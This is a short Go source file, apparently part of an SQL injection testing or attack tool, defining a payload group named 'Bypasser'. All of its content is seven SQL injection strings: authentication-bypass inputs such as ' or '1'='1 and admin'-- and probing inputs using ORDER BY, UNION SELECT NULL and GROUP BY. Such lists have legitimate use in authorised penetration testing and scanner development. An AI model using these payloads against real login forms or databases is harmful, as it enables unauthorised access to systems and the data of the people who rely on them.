package payloads

var Bypasser = PayloadGroup{
	DBMS: "Bypasser",
	Payloads: []Payload{
		{Type: "boolean", Content: "'%20or%20'1'='1"},
		{Type: "boolean", Content: "admin'--"},
		{Type: "boolean", Content: "admin' #"},
		{Type: "boolean", Content: "' or 1=1/*"},
		{Type: "boolean", Content: "1' ORDER BY 1--"},
		{Type: "boolean", Content: "1' UNION SELECT NULL--"},
		{Type: "boolean", Content: "1' GROUP BY 1--"},
	},
}
